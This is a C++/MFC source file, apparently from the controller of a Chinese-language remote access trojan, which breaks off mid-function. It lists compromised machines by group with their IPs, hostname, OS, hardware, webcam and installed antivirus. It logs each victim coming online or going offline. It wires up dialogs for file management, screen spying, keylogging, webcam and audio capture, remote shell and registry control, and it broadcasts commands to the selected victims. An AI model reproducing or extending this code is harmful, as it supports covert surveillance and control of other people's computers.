// MySuperGrid.cpp : implementation file
//

#include "stdafx.h"

#include "MySuperGrid.h"
#include "MainFrm.h"

#include "FileManagerDlg.h"
#include "ScreenSpyDlg.h"
#include "KeyBoardDlg.h"
#include "WebCamDlg.h"
#include "AudioDlg.h"
#include "SystemDlg.h"
#include "ShellDlg.h"
#include "122205622.h"

#include "ServiceDlg.h"
#include "LogView.h"
#include "resource.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

typedef struct
{
	char	*title;
	int		nWidth;
}ListHeartData;

ListHeartData g_Heart_Data[] =
{
	{_T("分组/IP"),	        130	},//0    由地理位置变为分组/IP
	{_T("网络"),		        38	},
	{_T("WAN-IP"),		    100	},//1
	{_T("LAN-IP"),		    100	},//2
	{_T("计算机名/备注"),	        90	},//3
	{_T("操作系统"),		     95	},//4
	{_T("处理器"),              95	},//5
	{_T("内存/可用"),       90	},//5
	{_T("硬盘/可用"),       90	},//5
	{_T("在线状态/延迟"),       90	},//5
	{_T("地理位置"),       90	},//5     由qq 变为地理位置
	{_T("网卡"),           90	},//5
	{_T("视频"),		      	50	},//7
	{_T("杀毒软件"),	        95  },//9
	{_T("上线版本"),		   	120	},//8
	{_T("配置时间"),	    	115	},//10	
};

int g_Heart_Num = 16;
CMySuperGrid *g_SuperGrid;
extern CIOCPServer *m_iocpServer;
extern CMainFrame *g_pFrame;
extern CLogView *g_pLogView;
/////////////////////////////////////////////////////////////////////////////
// CMySuperGrid
IMPLEMENT_DYNCREATE(CMySuperGrid, CSuperGridCtrl)

CMySuperGrid::CMySuperGrid()
{	
	if (((CWindsApp *)AfxGetApp())->m_bIsQQwryExist)
	{
	m_QQwry = new SEU_QQwry;
	m_QQwry->SetPath("QQWry.Dat");
	}
	g_SuperGrid = this;
	m_bDrag = TRUE;
}

CMySuperGrid::~CMySuperGrid()
{
}


BEGIN_MESSAGE_MAP(CMySuperGrid, CSuperGridCtrl)
//{{AFX_MSG_MAP(CMySuperGrid)
ON_WM_CREATE()
ON_NOTIFY_REFLECT(NM_CUSTOMDRAW, OnCustomDraw)
//}}AFX_MSG_MAP
//ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
//ON_MESSAGE(WM_REMOVEFROMLIST, OnReMoveList)
ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyBoardDialog)
ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenWebCamDialog)
ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
ON_MESSAGE(WM_OPENREGEDITDIALOG, OnOpenRegDialog)
ON_MESSAGE(WM_OPENSERVICEDIALOG, OnOpenServicesDialog)
//ON_MESSAGE(WM_OPENPROXYDIALOG, OnOpenProxyDialog)
//ON_MESSAGE(WM_FIND_YES, OnFindYES)
//ON_MESSAGE(WM_FIND_NO, OnFindNO)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMySuperGrid message handlers

int CMySuperGrid::OnCreate(LPCREATESTRUCT lpCreateStruct) 
{
	if (CSuperGridCtrl::OnCreate(lpCreateStruct) == -1)
		return -1;
	/////////////////////
	//remember this	
	///////////////////
	//associate imagelist with listviewctrl	
	if(!m_image.Create(IDB_BITMAP1,16,1,RGB(0, 255, 255)))
		
		return -1;
	
	SetImageList(&m_image, LVSIL_SMALL);
	CImageList *pImageList = GetImageList(LVSIL_SMALL);
	if(pImageList)
		ImageList_GetIconSize(pImageList->m_hImageList, &m_cxImage, &m_cyImage);
	else
		return -1;
	
	return 0;
}

void CMySuperGrid::DeleteGroup(UINT nTree)
{
	CTreeItem *pTree = GetTreeItem(nTree);
	if (IsRoot(pTree))
	{	
		if (!NumChildren(pTree))
		{
			DeleteItem(pTree->m_nIndex);
		}
	}
}

void CMySuperGrid::SelAllOnGroup(UINT nTree)
{
	CTreeItem *pTree = GetTreeItem(nTree);
	if (IsRoot(pTree))
	{	
		// 		pTree->m_pSuperGrid->GetListCtrl();
		// 		int nItems = pTree->m_nIndex + NumChildren(pTree);
		for (int i = 0; i < 10; i++)
		{
			SetItemState(i, 0, LVIS_SELECTED); 
		}
	}
}

void CMySuperGrid::NewGroup(CString strGroupName)
{
	CItemInfo *lp = new CItemInfo;

	lp->SetImage(4);
	lp->SetItemText(strGroupName);
	InsertRootItem(lp);
	//	InsertItem(pRoot, pItem, TRUE);
}

void CMySuperGrid::ChangeGroup(CString strGroupName)
{
	POSITION pos = GetFirstSelectedItemPosition();
	while(pos)
	{
		int	nItem = GetNextSelectedItem(pos);
		CTreeItem *pRoot = NULL;
		CTreeItem *pTree = GetTreeItem(nItem);
		if (IsRoot(pTree))
			return;
		CItemInfo* lp = new CItemInfo();
		lp->SetImage(4);
		lp->SetItemText(strGroupName);
		
		CTreeItem *pFindRoot = GroupSearch(strGroupName, NULL);
		if (pFindRoot)
		{
			if (IsRoot(pFindRoot))
			{
				pRoot = pFindRoot;
			}
			else
			{
				pRoot = InsertRootItem(lp);
			}
		}
		else
		{
			pRoot = InsertRootItem(lp);
		}
		ClientContext* pContext = (ClientContext *)pTree->m_lpNodeInfo->MyGetItemDate();
		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
		if (strGroupName == pContext->m_group)
			return;
		CItemInfo *pItem = CopyData(pTree->m_lpNodeInfo);
		
		InsertItem(pRoot, pItem, TRUE);
		DeleteItemEx(pTree, pTree->m_nIndex);
		UpGroupNum(LoginInfo->szUpGroup);
		
		//		ClientContext* pNewContext = NULL;// = (ClientContext *)pItem->MyGetItemDate();
		lstrcpy(pContext->m_group, strGroupName);
		//		AfxMessageBox(pNewContext->m_group);
		pItem->MySetItemDate((DWORD)pContext);
		UpGroupNum(strGroupName);
	}
}


// #TODO: 新加入的主机名字所属的分组名字 要对上服务端的上线名字
LRESULT CMySuperGrid::OnAddToList(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	if (pContext == NULL)
		return -1;
	CString	strToolTipsText, strOS, strPwd, strGroup;
	try
	{
		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
		CString	str;
		CItemInfo* lp = new CItemInfo();
		lp->SetImage(1);
		//add item text
		
		//if (lstrlen(LoginInfo->UpGroup) != NULL)
		//{
		//	lstrcpy(pContext->m_group, LoginInfo->UpGroup);
		//}
		//else
		//{
		//	AfxMessageBox(LoginInfo->UpGroup);
		//	lstrcpy(pContext->m_group, "Default");
		//	/*		CString Test;
		//	Test.Format("%d", GetTickCount());
		//	lstrcpy(pContext->m_group, Test);*/
		//}


		lstrcpy(pContext->m_group, LoginInfo->szUpGroup);
		str.Format("(0)%s", pContext->m_group);
		lp->SetItemText(str);



		CTreeItem *pRoot = NULL;
		CTreeItem *pFindRoot = GroupSearch(pContext->m_group, NULL);
		if (pFindRoot != NULL)
		{
			if (IsRoot(pFindRoot))
			{
				pRoot = pFindRoot;
			}
			else
			{
				//				AfxMessageBox("0");
				pRoot = InsertRootItem(lp);//previous on N.Y.P.D we call it CreateTreeCtrl(lp)
				if( pRoot == NULL )
				{	
					//					AfxMessageBox("0");
					return 0;
				}
			}
		}
		else
		{
			pRoot = InsertRootItem(lp);//previous on N.Y.P.D we call it CreateTreeCtrl(lp)
			if( pRoot == NULL )
			{	
				//				AfxMessageBox("1");
				return 0;
			}
		}
		
		CItemInfo* lpItemInfo = new CItemInfo();
		// 外网IP
		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
		CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
		lpItemInfo->SetItemText(IPAddress);
		
		////地理位置
		//if (((CWindsApp *)AfxGetApp())->m_bIsQQwryExist)
		//{
		//	str = m_QQwry->IPtoAdd(IPAddress);
		//	//			m_pListCtrl->SetItemText(i, 10, str);
		//	lpItemInfo->AddSubItemText(str);
		//	strToolTipsText += "\nArea : ";
		//	strToolTipsText += str;
		//	IPAddress += "地理位置: ";
		//	IPAddress += str;
		//}
		//lpItemInfo->AddSubItemText(IPAddress);
		// 网络类型
		if (LoginInfo->IPAddress.S_un.S_addr == sockAddr.sin_addr.S_un.S_addr)
		{
			str = "外网";
		}
		else
		{
			str = " --";
		}
		lpItemInfo->AddSubItemText(str);


		lpItemInfo->AddSubItemText(IPAddress);

		// 内网IP
		lpItemInfo->AddSubItemText(inet_ntoa(LoginInfo->IPAddress));
		//机器名
		lpItemInfo->AddSubItemText(LoginInfo->HostName);
		// 系统
		////////////////////////////////////////////////////////////////////////////////////////
		// 显示输出信息
		char *pszOS = NULL;
		switch (LoginInfo->OsVerInfoEx.dwPlatformId)
		{
		case VER_PLATFORM_WIN32_NT:
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion <= 4 )
			{
				pszOS = _T("WinNT");
				g_pFrame->nOSCount[0]++;
				g_pFrame->nOSCount[11]++;
			}
			else	if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
			{
				pszOS = _T("Win2000");
				g_pFrame->nOSCount[1]++;
				g_pFrame->nOSCount[11]++;
			}
			else	if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
			{
				pszOS = _T("WinXP");
				g_pFrame->nOSCount[2]++;
				g_pFrame->nOSCount[11]++;
			}
			else	if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 )
			{
				pszOS = _T("Win2003");
				g_pFrame->nOSCount[3]++;
				g_pFrame->nOSCount[11]++;
			}
			else	if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
				{
					pszOS = _T("WinVista"); 
					g_pFrame->nOSCount[4]++;
					g_pFrame->nOSCount[11]++;
				}
				else
				{
					pszOS = _T("Win2008");
					g_pFrame->nOSCount[5]++;
					g_pFrame->nOSCount[11]++;
				}
			}
			else	if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
				{
					pszOS = _T("Win7");
					g_pFrame->nOSCount[6]++;
					g_pFrame->nOSCount[11]++;
				}
				else
				{
					pszOS = _T("Win2008R2");
					g_pFrame->nOSCount[5]++;
					g_pFrame->nOSCount[11]++;
				}
			}
			else	if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
				{
					pszOS = _T("Win8");
					g_pFrame->nOSCount[7]++;
					g_pFrame->nOSCount[11]++;
				}
				else
				{
					pszOS = _T("Win2012");
					g_pFrame->nOSCount[8]++;
					g_pFrame->nOSCount[11]++;
				}
			}
			else	if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 3 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
				{
					pszOS = _T("Win8.1");
					g_pFrame->nOSCount[7]++;
					g_pFrame->nOSCount[11]++;
				}
				else
				{
					pszOS = _T("Win2012R2");
					g_pFrame->nOSCount[8]++;
					g_pFrame->nOSCount[11]++;
				}
			}
			else	if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 10 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
				{
					pszOS = _T("Win10");
					g_pFrame->nOSCount[9]++;
					g_pFrame->nOSCount[11]++;
				}
				else
				{
					pszOS = _T("Win2016");
					g_pFrame->nOSCount[10]++;
					g_pFrame->nOSCount[11]++;
				}
			}
		}	
		lstrcpy(pContext->m_system, pszOS);
		strOS.Format
			(
			"%s SP%d (Build %d)",
			pszOS, 
			LoginInfo->OsVerInfoEx.wServicePackMajor, 
			LoginInfo->OsVerInfoEx.dwBuildNumber
			);
		lpItemInfo->AddSubItemText(strOS);
		
		//CPU
		str.Format(_T("%d×%.2fGHz"), LoginInfo->nCPUNumber,(float)(LoginInfo->dwCPUClockMhz)/ 1024);
		lpItemInfo->AddSubItemText(str);
		//内存/可用内存
		str.Format(_T("%.2fGB/%.2fGB"),(float)LoginInfo->MemSize/1024, (float)LoginInfo->FreeMemSize/1024);
		lpItemInfo->AddSubItemText(str);
		// 硬盘/可用硬盘 
		str.Format(_T("%ldG/%ldG"),LoginInfo->DriverSize,LoginInfo->FreeDriverSize);
		lpItemInfo->AddSubItemText(str);
		
		//在线状态/延迟
		str.Format("%s / %d/mS", LoginInfo->bIsActive ? _T(" 离线") : _T(" 在线"),LoginInfo->dwSpeed);
		lpItemInfo->AddSubItemText(str);
		//// 在线QQ号
		//str.Format("%s", LoginInfo->nQQ);
		//lpItemInfo->AddSubItemText(str);
				//地理位置
		//if (((CWindsApp *)AfxGetApp())->m_bIsQQwryExist)
		//{
		//	str = m_QQwry->IPtoAdd(IPAddress);
		//	//			m_pListCtrl->SetItemText(i, 10, str);
		//	lpItemInfo->AddSubItemText(str);
		//	strToolTipsText += "\nArea : ";
		//	strToolTipsText += str;
		//	IPAddress += "地理位置: ";
		//	IPAddress += str;
		//}
		lpItemInfo->AddSubItemText("CHINA");
        
		// 网卡
		if (LoginInfo->Speed >= 1000)
		{
			str.Format("%dGbps", LoginInfo->Speed/1000);
		}
		else{
			str.Format("%dMbps", LoginInfo->Speed);
		}
		lpItemInfo->AddSubItemText(str);

		//SP
		str = LoginInfo->bIsWebCam ? _T(" 有") : _T(" -/-");
		lpItemInfo->AddSubItemText(str);

		// 杀毒软件
		str.Format("%s", LoginInfo->Virus);
		lpItemInfo->AddSubItemText(str);
		//版本信息
		lpItemInfo->AddSubItemText(LoginInfo->szVersion);
		//配置时间
		lpItemInfo->AddSubItemText(LoginInfo->BuildTime);

		

		
		//		else
		//		{
		//			m_pListCtrl->SetItemText(i, 10, "QQWry.dat丢失..");
		//			lpItemInfo->AddSubItemText("QQWry.dat丢失..");
		//			strToolTipsText += "\nArea : QQWry.dat丢失..";
		//		}
		PlaySound(MAKEINTRESOURCE(IDR_WAVE2),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
		g_pFrame->m_nUpCount++;
		
		InsertItem(pRoot, lpItemInfo, TRUE);
		//g_pFrame->UpCount();
		UpGroupNum(LoginInfo->szUpGroup);
		str.Format("上线 %s		所属分组【%s】", IPAddress, pContext->m_group);
		g_pLogView->InsertLogItem(str, 0, 1);
		//g_pLogView->AddToLog(str);
		lpItemInfo->MySetItemDate((DWORD)pContext);

		g_pFrame->ShowConnectionsNumber();//统计
		g_pFrame->ShowOSCount();//统计
		
	}catch(...){}
	return 0;
}

void CMySuperGrid::UpGroupNum(CString strGroupName)
{
/*
POSITION pos = GetRootHeadPosition();
while(pos)
{
CTreeItem *pParent = (CTreeItem*)GetNextRoot(pos);
int nItem = NumChildren(pParent);
}
	*/
	CTreeItem *pFindRoot = GroupSearch(strGroupName, NULL);
	if (pFindRoot)
	{
		int nItem = NumChildren(pFindRoot);
		CString str;
		str.Format("(%d)%s", nItem, strGroupName);
		SetItemText(pFindRoot->m_nIndex, 0, str);
		//		AfxMessageBox(pFindRoot->m_lpNodeInfo->GetItemText());
	}
}
void CMySuperGrid::SetClipboardText(CString &Data)
{
	if(::OpenClipboard(NULL) == 0)
		return;
	EmptyClipboard();
	HGLOBAL htext = GlobalAlloc(GHND, Data.GetLength() + 1);
	if(htext != 0)
	{
		CopyMemory(GlobalLock(htext), Data.GetBuffer(0), Data.GetLength());
		GlobalUnlock(htext);
		SetClipboardData(1, (HANDLE)htext);
		GlobalFree(htext);
	}
	CloseClipboard();
}
void CMySuperGrid::SendSelectCopy(BOOL msg)//ClientContext* pContext,
{
	// TODO: Add your command handler code here
	int IteraNum = -1;
	do{
		IteraNum = GetNextCilentNumber(IteraNum);
		CTreeItem* lpTree = GetTreeItem(IteraNum);
		if (lpTree){	
			if (IsRoot(lpTree)){
				continue;
			}
			ClientContext* pContext = (ClientContext*)lpTree->m_lpNodeInfo->MyGetItemDate();
			if (pContext == NULL){
				continue;
			}else{
				LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();

				if (msg){
					// 外网IP
					sockaddr_in  sockAddr;
					memset(&sockAddr, 0, sizeof(sockAddr));
					int nSockAddrLen = sizeof(sockAddr);
					BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
					CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
					SetClipboardText(IPAddress);
				}else
				{
					//全部信息
					CString Data;
					CString Name;
					CString	str;
					CString	strOS;
					//////////////////////////////////////////////////////////////////////////
					Name = "";
					// 外网IP
					sockaddr_in  sockAddr;
					memset(&sockAddr, 0, sizeof(sockAddr));
					int nSockAddrLen = sizeof(sockAddr);
					BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
					CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
					

					Name += IPAddress;
					Name += "	";
					Name += "\r\n";
					
					// 网络类型
					if (LoginInfo->IPAddress.S_un.S_addr == sockAddr.sin_addr.S_un.S_addr)
					{
						str = "外网";
					}
					else
					{
						str = " --";
					}
					Name += str;
					Name += "	";
					Name += "\r\n";

					Name += IPAddress;
					Name += "	";
					Name += "\r\n";
					// 内网IP
					
					Name += inet_ntoa(LoginInfo->IPAddress);
					Name += "	";
					Name += "\r\n";
					//机器名
					
					Name += LoginInfo->HostName;
					Name += "	";
					Name += "\r\n";
					// 系统
					////////////////////////////////////////////////////////////////////////////////////////
					// 显示输出信息
					char *pszOS = NULL;
					switch (LoginInfo->OsVerInfoEx.dwPlatformId)
					{
					case VER_PLATFORM_WIN32_NT:
						if ( LoginInfo->OsVerInfoEx.dwMajorVersion <= 4 )
						{
							pszOS = _T("WinNT");
							g_pFrame->nOSCount[0]++;
							g_pFrame->nOSCount[11]++;
						}
						else	if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
						{
							pszOS = _T("Win2000");
							g_pFrame->nOSCount[1]++;
							g_pFrame->nOSCount[11]++;
						}
						else	if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
						{
							pszOS = _T("WinXP");
							g_pFrame->nOSCount[2]++;
							g_pFrame->nOSCount[11]++;
						}
						else	if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 )
						{
							pszOS = _T("Win2003");
							g_pFrame->nOSCount[3]++;
							g_pFrame->nOSCount[11]++;
						}
						else	if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
						{
							if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
							{
								pszOS = _T("WinVista"); 
								g_pFrame->nOSCount[4]++;
								g_pFrame->nOSCount[11]++;
							}
							else
							{
								pszOS = _T("Win2008");
								g_pFrame->nOSCount[5]++;
								g_pFrame->nOSCount[11]++;
							}
						}
						else	if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
						{
							if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
							{
								pszOS = _T("Win7");
								g_pFrame->nOSCount[6]++;
								g_pFrame->nOSCount[11]++;
							}
							else
							{
								pszOS = _T("Win2008R2");
								g_pFrame->nOSCount[5]++;
								g_pFrame->nOSCount[11]++;
							}
						}
						else	if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 )
						{
							if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
							{
								pszOS = _T("Win8");
								g_pFrame->nOSCount[7]++;
								g_pFrame->nOSCount[11]++;
							}
							else
							{
								pszOS = _T("Win2012");
								g_pFrame->nOSCount[8]++;
								g_pFrame->nOSCount[11]++;
							}
						}
						else	if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 3 )
						{
							if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
							{
								pszOS = _T("Win8.1");
								g_pFrame->nOSCount[7]++;
								g_pFrame->nOSCount[11]++;
							}
							else
							{
								pszOS = _T("Win2012R2");
								g_pFrame->nOSCount[8]++;
								g_pFrame->nOSCount[11]++;
							}
						}
						else	if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 10 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
						{
							if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
							{
								pszOS = _T("Win10");
								g_pFrame->nOSCount[9]++;
								g_pFrame->nOSCount[11]++;
							}
							else
							{
								pszOS = _T("Win2016");
								g_pFrame->nOSCount[10]++;
								g_pFrame->nOSCount[11]++;
							}
						}
					}	
					strOS.Format
						(
						"%s SP%d (Build %d)",
						pszOS, 
						LoginInfo->OsVerInfoEx.wServicePackMajor, 
						LoginInfo->OsVerInfoEx.dwBuildNumber
						);
					Name += strOS;
					Name += "	";
					Name += "\r\n";
				
					//CPU
					str.Format(_T("%d×%.2fGHz"), LoginInfo->nCPUNumber,(float)(LoginInfo->dwCPUClockMhz)/ 1024);
					Name += str;
					Name += "	";
					Name += "\r\n";
					//内存/可用内存
					str.Format(_T("%.2fGB/%.2fGB"),(float)LoginInfo->MemSize/1024, (float)LoginInfo->FreeMemSize/1024);
					Name += str;
					Name += "	";
					Name += "\r\n";
					// 硬盘/可用硬盘 
					str.Format(_T("%ldG/%ldG"),LoginInfo->DriverSize,LoginInfo->FreeDriverSize);
					Name += str;
					Name += "	";
					Name += "\r\n";

					//在线状态/延迟
					str.Format("%s / %d/mS", LoginInfo->bIsActive ? _T(" 离线") : _T(" 在线"),LoginInfo->dwSpeed);
					Name += str;
					Name += "	";
					Name += "\r\n";
					// 在线QQ号
					str.Format("%s", LoginInfo->nQQ);
					Name += str;
					Name += "	";
					Name += "\r\n";

					// 网卡
					if (LoginInfo->Speed >= 1000)
					{
						str.Format("%dGbps", LoginInfo->Speed/1000);
					}
					else{
						str.Format("%dMbps", LoginInfo->Speed);
					}
					Name += str;
					Name += "	";
					Name += "\r\n";

					//SP
					str = LoginInfo->bIsWebCam ? _T(" 有") : _T(" -/-");
					Name += str;
					Name += "	";
					Name += "\r\n";

					// 杀毒软件
					str.Format("%s", LoginInfo->Virus);
					Name += str;
					Name += "	";
					Name += "\r\n";
					//版本信息
				
					Name += LoginInfo->szVersion;
					Name += "	";
					Name += "\r\n";
					//配置时间
					Name += LoginInfo->BuildTime;
					Name += "	";
					Name += "\r\n";
					
					//////////////////////////////////////////////////////////////////////////
					SetClipboardText(Name);
				

				}
				
				//m_iocpServer->Send(pContext, pData, nSize);
			}
		}
		
	}
	while(IteraNum != -1);
	

}
void CMySuperGrid::SendSelectCommand(PBYTE pData, UINT nSize)//ClientContext* pContext,
{
	// TODO: Add your command handler code here
	int IteraNum = -1;
	//	AfxMessageBox("1");
	do
	{
		IteraNum = GetNextCilentNumber(IteraNum);
		//		CString str;
		//		str.Format("%d", IteraNum);
		//		AfxMessageBox(str);
		CTreeItem* lpTree = GetTreeItem(IteraNum);
		if (lpTree)
		{	
			if (IsRoot(lpTree))
			{
				//				AfxMessageBox("1");
				continue;
			}
			//			AfxMessageBox("s");
			//			str.Format("Tree %d", lpTree->m_nIndex);
			//			AfxMessageBox(str);	
			//			AfxMessageBox(lpTree->m_lpNodeInfo->GetSubItem(4));
			ClientContext* pContext = (ClientContext*)lpTree->m_lpNodeInfo->MyGetItemDate();
			if (pContext == NULL)
			{
				continue;
			}
			else
			{
				m_iocpServer->Send(pContext, pData, nSize);
			}
			//			{
			//				AfxMessageBox("s1");
			//			}
			
		}
		//		CString strClient;
		//		strClient = m_List.GetIDText(IteraNum);
		//		ClientContext* pContext = GetIDClient(strClient);
		//		if (pContext == NULL)
		//		{
		//			continue;
		//		}
		//		else
		//		{
		//			m_iocpServer->Send(pContext, pData, nSize);
		
		// 		}
	}
	while(IteraNum != -1);
}

LRESULT CMySuperGrid::OnReMoveList(WPARAM wParam, LPARAM lParam)
{	
	ClientContext	*pContext = (ClientContext *)lParam;
	LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
	if (pContext == NULL)
		return -1;
	// 	CString str;
	// 	str.Format("%d", pContext->m_Dialog[0]);
	//  AfxMessageBox(str);
	switch (pContext->m_Dialog[0])
	{
	case FILEMANAGER_DLG:
	case SCREENSPY_DLG:
	case KEYBOARD_DLG:
	case WEBCAM_DLG:
	case AUDIO_DLG:
	case SHELL_DLG:
	case SYSTEMINFO_DLG:
	case SYSTEM_DLG:
	case SERVICE_DLG:
	case REGEDIT_DLG:
	case CHAT_DLG:
	case QQINFO_DLG:
	case PROXYMAP_DLG:
		((CDialog*)pContext->m_Dialog[1])->DestroyWindow();
	default:
		break;
	}
	CString m_IPAddress,str;
	//	AfxMessageBox(pContext->m_group);
	CTreeItem *pFindRoot = GroupSearch(pContext->m_group, NULL);
	if (pFindRoot == NULL)
		return -1;
	int nCount = NumChildren(pFindRoot);
	if ( nCount > 0)
	{
		int nNum = 0;
		POSITION pos = GetHeadPosition(pFindRoot);
		while (pos)
		{	
			CTreeItem *pChild = GetNextChild(pFindRoot, pos);
			CItemInfo* lp = GetData(pChild);
			if (pContext == (ClientContext *)lp->MyGetItemDate())
			{
				m_IPAddress = lp->GetItemText();
				//				AfxMessageBox("Find");
				//				CString strPrint;
				//				strPrint.Format("%d + %d", nNum, pChild->m_nIndex);
				//				AfxMessageBox(strPrint);
				// 				sockaddr_in  sockAddr;
				// 				memset(&sockAddr, 0, sizeof(sockAddr));
				// 				int nSockAddrLen = sizeof(sockAddr);
				// 				BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
				// 				
				// 				m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
				DeleteItemEx(pChild, nNum + pChild->m_nIndex);
				nNum++;
				g_pFrame->m_nUpCount--;
			}
			
		}
	}

	//////////////////////////////////////////////////////////////////////////
	if (pContext->m_system == CString("WinNT"))
	{
		g_pFrame->nOSCount[0]--;
		g_pFrame->nOSCount[11]--;
	}
	if (pContext->m_system == CString("Win2000"))
	{
		g_pFrame->nOSCount[1]--;
		g_pFrame->nOSCount[11]--;
	}
	if (pContext->m_system == CString("WinXP"))
	{
		g_pFrame->nOSCount[2]--;
		g_pFrame->nOSCount[11]--;
	}
	if (pContext->m_system == CString("Win2003"))
	{
		g_pFrame->nOSCount[3]--;
		g_pFrame->nOSCount[11]--;
	}
	if (pContext->m_system == CString("WinVista"))
	{
		g_pFrame->nOSCount[4]--;
		g_pFrame->nOSCount[11]--;
	}
	if (pContext->m_system == CString("Win2008"))
	{
		g_pFrame->nOSCount[5]--;
		g_pFrame->nOSCount[11]--;
	}
	if (pContext->m_system == CString("Win7"))
	{
		g_pFrame->nOSCount[6]--;
		g_pFrame->nOSCount[11]--;
	}
	if (pContext->m_system == CString("Win2008R2"))
	{
		g_pFrame->nOSCount[5]--;
		g_pFrame->nOSCount[11]--;
	}

	if (pContext->m_system == CString("Win8"))
	{
		g_pFrame->nOSCount[7]--;
		g_pFrame->nOSCount[11]--;
	}
	if (pContext->m_system == CString("Win2012"))
	{
		g_pFrame->nOSCount[8]--;
		g_pFrame->nOSCount[11]--;
	}
	if (pContext->m_system == CString("Win8.1"))
	{
		g_pFrame->nOSCount[7]--;
		g_pFrame->nOSCount[11]--;
	}
	if (pContext->m_system == CString("Win2012R2"))
	{
		g_pFrame->nOSCount[8]--;
		g_pFrame->nOSCount[11]--;
	}
	if (pContext->m_system == CString("Win10"))
	{
		g_pFrame->nOSCount[9]--;
		g_pFrame->nOSCount[11]--;
	}
	if (pContext->m_system == CString("Win2016"))
	{
		g_pFrame->nOSCount[10]--;
		g_pFrame->nOSCount[11]--;
	}
	
		
	
	
	
	//////////////////////////////////////////////////////////////////////////
	UpGroupNum(pContext->m_group);
	str.Format("下线 %s		所属分组【%s】", m_IPAddress, pContext->m_group);
	g_pLogView->InsertLogItem(str, 0, 1);
	PlaySound(MAKEINTRESOURCE(IDR_WAVE1),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);

	// 更新当前连接总数
	g_pFrame->ShowOSCount();//统计
	g_pFrame->ShowConnectionsNumber();
	
	
	return 0;
}


void CMySuperGrid::InitializeGrid()
{
/*
ExtendedStyle support:
LVS_EX_TRACKSELECT
LVS_EX_GRIDLINES
LVS_EX_FLATSB
